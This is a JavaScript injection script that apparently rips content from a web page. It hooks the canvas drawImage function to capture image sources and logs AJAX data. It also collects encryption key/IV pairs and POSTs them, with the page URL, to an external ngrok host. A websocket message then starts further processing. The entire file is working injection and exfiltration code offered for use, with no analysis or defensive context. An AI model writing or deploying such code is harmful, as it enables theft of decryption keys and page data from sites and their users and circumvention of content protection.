alert("Injected ^_^")
var interval = null
window.keys = {}
window.rip_configs = {
  ajax_logger: "/api/ajax-logger",
  keys_logger: "/api/keys-logger",
  host: "https://eel-moral-ape.ngrok-free.app",
}

function blobToUint8Array(blob) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onload = function () {
      const arrayBuffer = this.result
      const uint8Array = new Uint8Array(arrayBuffer)
      resolve(uint8Array)
    }
    reader.onerror = function () {
      reject(new Error("Error reading Blob data."))
    }
    reader.readAsArrayBuffer(blob)
  })
}

async function load_segment(url) {
  try {
    const response = await fetch(url)
    alert(`Status: ${response.status}, statusText: ${response.statusText}`)
  } catch (error) {}
}

;(function () {
  var drawImage = CanvasRenderingContext2D.prototype.drawImage
  CanvasRenderingContext2D.prototype.drawImage = function () {
    const image = arguments[0]

    this.canvas.toBlob(async function (blob) {
      alert(image.src)
    }, "image/jpeg")

    drawImage.apply(this, arguments)
  }
})()

window.logger_callback = async (url, data_logger, show_alert = false) => {
  if (typeof fetch !== "undefined") {
    try {
      const response = await fetch(url, {
        method: "POST",
        body: JSON.stringify(data_logger),
        headers: {
          "Content-Type": "application/json",
          "X-Inject-Url": window.location.href,
        },
      })

      if (show_alert) {
        const data = await response.json()
        data.message && alert(data.message)
      }
    } catch (error) {
      show_alert && alert(error.message)
    }
  }
}

window.ajax_logger = function (data) {
  const { host, ajax_logger } = window.rip_configs || {}
  if (host && ajax_logger) window.logger_callback(host + ajax_logger, data, true)
}

window.key_logger = function (data) {
  const { host, keys_logger, key_logger } = window.rip_configs || {}

  if (data.key && data.iv && host) {
    window.keys[data.key] = data.iv

    if (window.key_logger_timeout) {
      clearTimeout(window.key_logger_timeout)
      window.key_logger_timeout = null
    }

    window.key_logger_timeout = setTimeout(async () => {
      await window.logger_callback(host + keys_logger, { fid: window.fid, keys: window.keys }, true)
      if (window.socket) window.socket.send(JSON.stringify({ action: "start", payload: window.fid }))
    }, 3000)
  }

  if (host && key_logger) window.logger_callback(host + key_logger, data)
}
